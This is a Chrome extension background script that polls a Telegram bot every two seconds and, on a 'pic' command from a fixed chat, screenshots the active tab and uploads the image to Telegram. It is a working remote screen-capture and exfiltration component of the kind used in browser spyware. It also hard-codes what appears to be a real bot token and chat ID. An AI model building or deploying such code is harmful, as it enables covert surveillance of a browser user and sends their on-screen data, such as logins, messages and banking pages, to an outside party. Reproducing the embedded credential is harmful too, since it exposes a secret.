// ---------- debug version ----------
let BOT_TOKEN = '8847410020:AAHShYttoQynYGIBhr4Jmz1V7sD9u1Lopag';
let CHAT_ID = '6610965250';
let lastUpdateId = 0;
let isProcessing = false;

console.log('Service worker started');

chrome.storage.local.get(['botToken', 'chatId', 'lastUpdateId'], (r) => {
  BOT_TOKEN = r.botToken || '';
  CHAT_ID = r.chatId || '';
  lastUpdateId = r.lastUpdateId || 0;
  console.log('Loaded settings - Token:', BOT_TOKEN ? 'present' : 'MISSING', 'Chat ID:', CHAT_ID || 'MISSING');
  if (BOT_TOKEN && CHAT_ID) {
    startPolling();
    console.log('Polling started');
  } else {
    console.warn('No token or chat ID – go to Options page to set them.');
  }
});

chrome.storage.onChanged.addListener((changes) => {
  if (changes.botToken) {
    BOT_TOKEN = changes.botToken.newValue;
    console.log('Bot token updated');
  }
  if (changes.chatId) {
    CHAT_ID = changes.chatId.newValue;
    console.log('Chat ID updated');
  }
  startPolling();
});

function startPolling() {
  if (!BOT_TOKEN || !CHAT_ID) return;
  chrome.alarms.create('pollTelegram', { periodInMinutes: 2/60 }); // every 2 sec
}

chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name !== 'pollTelegram') return;
  if (isProcessing) {
    console.log('Alarm skipped – processing in progress');
    return;
  }
  isProcessing = true;
  console.log('Polling Telegram...');

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=2`;
    const res = await fetch(url);
    const data = await res.json();
    console.log('Telegram response:', data);

    if (data.ok && data.result.length) {
      for (const upd of data.result) {
        lastUpdateId = upd.update_id;
        const msg = upd.message;
        if (msg && msg.chat && String(msg.chat.id) === String(CHAT_ID)) {
          const text = (msg.text || '').trim();
          console.log('Received message:', text);
          if (text.toLowerCase() === 'pic') {
            console.log('Command Pic detected – capturing screenshot...');
            await chrome.storage.local.set({ lastUpdateId });
            await captureActiveTab();
            break;
          }
        }
      }
      await chrome.storage.local.set({ lastUpdateId });
    }
  } catch (err) {
    console.error('Polling error:', err);
  }
  finally {
    isProcessing = false;
  }
});

async function captureActiveTab() {
  if (!BOT_TOKEN || !CHAT_ID) return;
  try {
    console.log('Taking screenshot...');
    const dataUrl = await chrome.tabs.captureVisibleTab(null, { format: 'png' });
    if (!dataUrl) {
      console.warn('captureVisibleTab returned nothing');
      return;
    }
    console.log('Screenshot captured, sending to Telegram...');

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    const blob = await (await fetch(dataUrl)).blob();
    formData.append('photo', blob, 'screenshot.png');

    const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    const result = await sendRes.json();
    console.log('Telegram sendPhoto response:', result);
  } catch (err) {
    console.error('Capture/send error:', err);
  }
}